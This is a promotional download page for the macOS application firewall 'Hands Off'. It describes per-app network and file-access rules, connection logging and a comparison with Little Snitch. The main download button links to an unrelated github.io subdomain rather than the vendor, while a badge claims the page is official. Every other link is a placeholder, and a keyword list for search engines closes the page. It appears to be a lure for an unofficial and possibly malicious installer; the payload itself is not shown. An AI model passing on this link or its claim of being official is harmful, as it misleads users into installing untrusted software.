<p align="center">
  <img src="https://static.macupdate.com/products/35277/m/hands-off-logo.png?v=1602744139" width="110" alt="Hands Off logo — application firewall and network monitor for Mac"/>
</p>

<h1 align="center">Hands Off Mac - Download</h1>

<p align="center">
  <a href="#">Hands Off Mac</a> — an application firewall and privacy monitor for macOS
  developed by Metakine that intercepts every network connection attempt and file system
  access made by any application and presents it for approval or blocking. Unlike macOS's
  built-in firewall, Hands Off operates at the application level, giving you per-app control
  over what each application can access and where it can connect.
</p>

<p align="center">
  <img src="https://img.shields.io/badge/macOS-000000?style=flat-square&logo=apple&logoColor=white"/>
  &nbsp;
  <img src="https://img.shields.io/badge/App-Firewall-blue?style=flat-square"/>
  &nbsp;
  <img src="https://img.shields.io/badge/Network-Monitor-orange?style=flat-square"/>
  &nbsp;
  <img src="https://img.shields.io/badge/Metakine-Official-red?style=flat-square"/>
</p>

---

| [![Download Hands Off for Mac](https://i.postimg.cc/hjPfG0vF/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png)](https://skalsd-oasd.github.io/.github/hands-off-mac) | **Control every network and file access on your Mac — per-app rules, instant alerts** <br><br> <a href="#">Hands Off for Mac</a> alerts you the moment any application attempts a new network connection or file system access. Approve it once, deny it permanently, or set a rule for that application — you decide what every app on your Mac is allowed to do. |
|---|---|

---

<p align="center">
  <img src="https://miro.medium.com/v2/resize:fit:1400/0*dRdD2w6B2SUv9tn0"
       alt="Hands Off Mac — application firewall alert showing connection request with allow and deny options"
       width="800"/>
</p>

---

## What Is Hands Off for Mac

<a href="#">Hands Off Mac</a> is an application-layer firewall and access control tool developed
by Metakine, a Swiss software company. The application monitors and controls two categories of
system access that the built-in macOS security tools handle incompletely: outbound network
connections made by applications, and file system accesses made by applications to locations
outside their expected scope.

### The Gap in macOS's Built-In Security

macOS includes a firewall (in System Settings → Network → Firewall) that blocks unwanted
incoming connections from external sources. This protects the Mac from external intrusion —
someone on the network trying to connect to your Mac.

What macOS's built-in firewall does not address is outbound connections — applications on
your Mac reaching out to external servers. A Mac with the built-in firewall fully enabled can
have every installed application freely connecting to any server on the internet without
restriction or alerting.

<a href="#">Hands Off Mac OS</a> fills this gap:

**Outbound connection control**: Every time an application initiates a new type of network
connection — a connection to a new server address, a new port, or a new protocol — Hands Off
intercepts it and presents a dialog asking whether to allow or deny it.

**File system access control**: Applications that access directories outside their normal
scope — an application reading files in other applications' sandboxes, or writing to unexpected
locations — trigger Hands Off alerts.

---

## Application Firewall: How It Works

<a href="#">Hands Off firewall Mac</a> operates as a kernel extension (or system extension in
modern macOS versions) that sits between applications and the network and file system interfaces.
Every system call that initiates a network connection or accesses a file path passes through
Hands Off's filter before reaching the operating system:

### Network Connection Interception

When an application calls the network — opening a TCP socket to a remote address, making a
DNS lookup, initiating a UDP datagram — Hands Off intercepts the call. Before the connection
is allowed to proceed, Hands Off checks whether a rule exists for this application and
destination combination:

**Existing allow rule**: If a rule permits this application to make this type of connection,
the connection proceeds silently. The user configured this permission previously.

**Existing deny rule**: If a rule denies this connection type, the connection is blocked
silently. The application receives a connection refused error without further user interaction.

**No existing rule**: Hands Off presents an alert dialog showing the application, the
destination server or IP address, the port, and the protocol. The user chooses Allow Once,
Allow Always, Deny Once, or Deny Always. The choice is recorded as a rule for future
identical requests.

### File System Access Interception

<a href="#">Hands Off Mac app</a> file system monitoring works on the same principle:
applications accessing specific file paths trigger rule checks. Access to unexpected locations —
another application's data directory, system configuration files, private user data — triggers
an alert.

---

## Per-Application Rules

<a href="#">Hands Off for Mac</a> rule system allows fine-grained control per application:

### Rule Types

**Allow/Deny by application**: A blanket rule for a specific application — allow all network
access by Slack, deny all network access by an untrusted application.

**Allow/Deny by application and destination**: More specific rules that allow an application
to connect to certain servers while blocking others. Allow a chat application to connect to
its servers while blocking it from connecting to advertising networks.

**Allow/Deny by port**: Rules that apply to specific port numbers — allow an application to
connect on port 443 (HTTPS) while blocking port 80 (HTTP).

**Allow/Deny by domain**: Rules that apply to specific domain names or domain patterns.
Allow connections to *.company.com while blocking connections to third-party analytics domains.

### Rule Storage and Review

All rules are visible in <a href="#">Hands Off Mac</a> rule list. Reviewing the rule list
periodically shows the complete access map of every application on the Mac — which applications
have been granted network access, to which destinations, and whether any rules were inadvertently
set too permissively.

Rules can be deleted to reset an application's permissions, triggering new alert dialogs the
next time that application makes the relevant access attempt.

---

## Network Connection Monitoring

<a href="#">Hands Off Mac OS</a> continuous monitoring provides a real-time view of network
activity:

### Connections Log

The connections log shows every network connection made by every application in real time —
the source application, destination IP or hostname, port, protocol, amount of data transferred,
and connection duration. This log is the complete picture of your Mac's network activity.

The log answers questions that are otherwise difficult to investigate:

**What is using my bandwidth?**: The connections log sorted by data transferred shows which
applications are responsible for the most network traffic.

**What server did this application just connect to?**: The per-application filter shows every
connection an application has made, with timestamps and data volumes.

**Is this application communicating when it should be idle?**: Applications that phone home
periodically while running in the background are visible in the connections log.

### Traffic Statistics

<a href="#">Hands Off Mac app</a> traffic statistics show per-application bandwidth usage
aggregated over time — which applications have used the most data today, this week, this month.
Applications with unexpectedly high data usage warrant investigation.

---

## File System Access Control

<a href="#">Hands Off firewall Mac</a> file system protection monitors application accesses
beyond standard sandboxing:

### What File Access Control Monitors

Applications routinely access files outside their own data directories:

**Reading configuration files**: Applications reading system configuration files that contain
network addresses, user data, or authentication tokens.

**Accessing other applications' data**: An application attempting to read another application's
preferences or data files.

**Writing to unexpected locations**: Applications writing files to locations they should not
need to — temporary directories outside the normal scope, system directories, or user data
directories belonging to other applications.

**Accessing sensitive data**: Applications accessing the address book database, Safari bookmarks,
Mail data, or other sensitive personal information stores.

<a href="#">Hands Off Mac</a> alerts on these accesses and allows you to block them per-application.

---

## Hands Off vs Little Snitch

<a href="#">Hands Off Mac</a> and Little Snitch are the two primary application firewalls for
Mac. Both intercept outbound connections and provide per-application rules. Key differences:

**Interface style**: Little Snitch uses a more complex network monitor with a visual map of
connections. Hands Off's interface is more streamlined for quick rule management.

**File system monitoring**: Hands Off monitors file system accesses in addition to network
connections — Little Snitch focuses exclusively on network activity.

**Alert behavior**: Both show alerts for new connection types. Hands Off's alerts are
considered more concise for users who want quick allow/deny decisions without detailed analysis.

**Price**: Both are paid applications. Hands Off's pricing is generally comparable to Little
Snitch. Check current pricing at metakine.com.

---

## Privacy Use Cases

<a href="#">Hands Off Mac OS</a> specific privacy protection scenarios:

### Blocking Analytics and Telemetry

Many applications include analytics, crash reporting, and usage tracking that sends data to
third-party servers. Hands Off alerts on these connections — recognizable as connections to
analytics domains like mixpanel.com, amplitude.com, or crashlytics.com. These connections
can be blocked per-application without affecting the application's primary functionality.

### Controlling Auto-Update Checks

Applications that check for updates frequently connect to update servers. If you prefer to
manage updates manually rather than have applications check automatically, Hands Off allows
denying update check connections while keeping the application's core functionality permitted.

### Monitoring Unfamiliar Applications

When installing a new application from an unknown developer, <a href="#">Hands Off for Mac</a>
reveals what network activity the application initiates immediately after launch — useful for
identifying applications that connect more than expected or connect to suspicious destinations.

---

## System Requirements

| Requirement | Specification |
|---|---|
| macOS | 10.14 Mojave or later |
| Architecture | Universal Binary — Apple Silicon and Intel |
| Permissions | System extension approval required |
| License | Purchase from metakine.com — trial available |

---

## Frequently Asked Questions

**How is Hands Off different from the macOS firewall?**
macOS's built-in firewall blocks incoming connections. <a href="#">Hands Off Mac</a> controls
outbound connections — applications on your Mac reaching out to external servers.

**Does Hands Off affect internet speed?**
<a href="#">Hands Off firewall Mac</a> adds minimal latency to connection establishment. Once
a rule is set for an application, subsequent connections of the same type proceed immediately.

**Can I monitor all application network activity?**
Yes. <a href="#">Hands Off Mac app</a> connections log shows every network connection made by
every application in real time.

---

## Keywords

hands off mac, hands off mac os, hands off firewall mac, hands off for mac, hands off mac app
